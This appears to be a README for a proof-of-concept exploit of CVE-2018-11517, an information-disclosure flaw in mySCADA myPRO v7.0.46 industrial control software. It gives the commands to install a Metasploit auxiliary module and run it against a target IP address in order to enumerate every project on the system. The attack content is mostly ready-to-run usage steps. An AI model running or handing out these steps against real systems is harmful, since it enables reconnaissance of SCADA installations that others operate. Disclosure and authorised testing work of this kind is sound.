# mySCADA myPRO 7 - projectID Disclosure

mySCADA myPRO v7.0.46 has another vulnerability to discover all projects in the system.

## CVE-2018-11517
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11517

```
git clone https://github.com/EmreOvunc/mySCADA-myPRO-7-projectID-Disclosure.git
 
cd mySCADA-myPRO-7-projectID-Disclosure/

cp mypro_enum_projectid.rb /usr/share/metasploit-framework/modules/auxiliary/gather/

msfconsole

use auxiliary/gather/mypro_enum_projectid 

set RHOST [IP ADDRESS]

run
```

![alt tag](https://emreovunc.com/images/mySCADA_myPRO7-projectID.png)
-
